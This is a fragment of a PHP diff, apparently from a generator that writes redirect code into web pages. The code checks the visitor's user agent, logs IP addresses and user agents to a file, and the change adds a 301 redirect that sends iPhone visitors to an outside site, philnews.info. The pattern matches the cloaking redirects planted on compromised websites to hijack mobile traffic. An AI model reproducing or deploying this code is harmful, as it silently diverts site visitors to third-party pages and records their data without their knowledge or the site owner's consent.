@@ -250,11 +250,7 @@ if (
     $Android = stripos($_SERVER[\'HTTP_USER_AGENT\'],"Android");
     $webOS   = stripos($_SERVER[\'HTTP_USER_AGENT\'],"webOS");
     if($iPhone) {
-      echo "' . $redirectPN . '";
-      $fAgent = fopen($allowedAgents, \'a\');
-      $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' ok \' . PHP_EOL;
-      fwrite($fAgent, $agent);
-      fclose($fAgent);
+        header(\'Location: http://philnews.info\', true, 301);
       die();
     } else {
     $fAgent = fopen($allowedAgents, \'a\');
@@ -262,6 +258,7 @@ if (
     fwrite($fAgent, $agent);
     fclose($fAgent);
     header(\'Location: ' . $redirectUrl . '\', true, 301);
+    die();
     }
 }
 
